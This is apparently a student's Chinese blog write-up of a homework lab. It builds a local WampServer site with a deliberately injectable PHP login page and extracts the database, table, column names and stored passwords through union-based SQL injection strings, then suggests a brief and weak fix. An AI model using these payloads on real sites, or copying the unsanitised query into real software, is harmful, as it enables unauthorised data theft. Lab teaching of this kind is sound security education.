---
title: 简单sql注入环境搭建及注入
date: 2019-10-12 15:31:12
tags: [sql注入，wampserver]
categories: sql注入
---

网络安全作业二，sql注入，搭建注入环境并注入，以及修补注入漏洞。（图片显示不了的话，点开链接就能看了）

<!--more-->

## 一、服务器搭建

### 1、安装wampserver

wampserver在windows下将Apache+PHP+Mysql 集成,一键操作，比较方便，在此选用是因为重点在sql注入上，而不是服务器的搭建，如果想透彻学习服务器搭建，建议不要使用集成环境，可以自己一个一个装，修改配置，最后将这些连到到一起，一个网站就搭好了。

### 2、安装后的可能会遇到的问题

安装完成后，打开，电脑右下角wampserver的图标应该是绿色的，如果是红色和橙色，那就是有些服务没有开启，在图标上左键查看是哪个服务没有开启。

![3~_25K4IG`WGJ646US7GU4B.png](https://i.loli.net/2019/10/12/nexdYS84XCuc2hv.png)

花花在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。

### 3、编写登录页和测试页

左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下：

login.php:

```php
<html>
<head>
<title>网络安全作业二</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>
 <body >
<form action="test.php" method="post">
  <fieldset >
    <legend>自建sql注入平台</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密  码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>
```

test.php:

```php
<?php
$pwd=$_POST['password'];
$uname=$_POST['username'];
//echo "您当前执行的sql语句为：" ;
//echo "select * from admin where passward='$pwd' and name='$uname'<br/>";
//echo "<hr>";
$mysqli = new mysqli('127.0.0.1','root','','sqlin'); 
if(mysqli_connect_errno()){
    printf("连接失败:%s<br>",mysqli_connect_error());
    exit();
}
$result = $mysqli->query("select * from admin where name='$uname'");
//print_r($result->fetch_array(MYSQLI_ASSOC));
if($row=mysqli_fetch_row($result))
{
	printf ("%s : %s",$row[0],$row[1]);
       	echo "<br>";
	echo "success！";
}
else
{
	echo "账号或密码错误！";
}
$mysqli->close();
$result->close();?>
```

然后在浏览器上输入http://localhost/login.php，即可进入登陆页面。

不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表，由于以前做过数据库实验，命令在此不在赘述。

![_Z47~NFQ_K3X`XS_D~DT9~9.png](https://i.loli.net/2019/10/12/cC5yGfQdmr3JabB.png)

![6__2BL4Q_2N89_7SVVLTMF3.png](https://i.loli.net/2019/10/12/jINGSXkoeb6iME2.png)

这样环境就搭好了，可以开始注入了。

## 二、简单的sql注入

### 判断有几个显示位。

输入如下:

```bash
用户名：1' union select 1,2,3#
密码：111（任意）
```

发现报错，显示位不是3，重试

```bash
用户名：1' union select 1,2#
密码：111（任意）
```

![_AHNB_05K_I_RL5_6_9LCH7.png](https://i.loli.net/2019/10/12/Sas25K4ApngoYRV.png)

显示位为两位

### 确定表有几列

```bash
用户名：1' order by 3#
密码：111（任意）
```

报错，不是3列

```bash
用户名：1' order by 2#
密码：111（任意）
```

![G_I__P__36X9D_O_YK_OMO9.png](https://i.loli.net/2019/10/12/bSEAV4kptPBscaw.png)

表有2列

### 获取数据库名

```bash
用户名：1' union select 1,database() #
密码：111（任意）
```

![0FV6JIXIMQJY_WPE0~I__7T.png](https://i.loli.net/2019/10/12/NMXYBixLmqFGac1.png)

数据库名为sqlin

### 获取表名

```bash
用户名：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
密码：111（任意）
```

![X_7_7ZT1P~YPSMBJY`@_026.png](https://i.loli.net/2019/10/12/eXykOGPu6CRo2cY.png)

表名为admin

### 获取列名

```bash
用户名：0' union select (select column_name from information_schema.columns where table_name='admin' limit 0,1),(select column_name from information_schema.columns where table_name='admin' limit 1,2)#
密码：111（任意）
```

![9KK6GFE1E52BIZXKGB90_NS.png](https://i.loli.net/2019/10/12/nuq1vxTB3s5HzXd.png)

列名为name,passward

### 获取数据

```bash
用户名：1' union select name,passward from admin#
密码：111（任意）
```

![M_8AP5UDLU_F3~Z2_E_GTGN.png](https://i.loli.net/2019/10/12/X5vC8eqN9zmx3MI.png)

得到用户名及密码

（建表的时候把password拼错了）😂

## 三、注入漏洞修补

由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。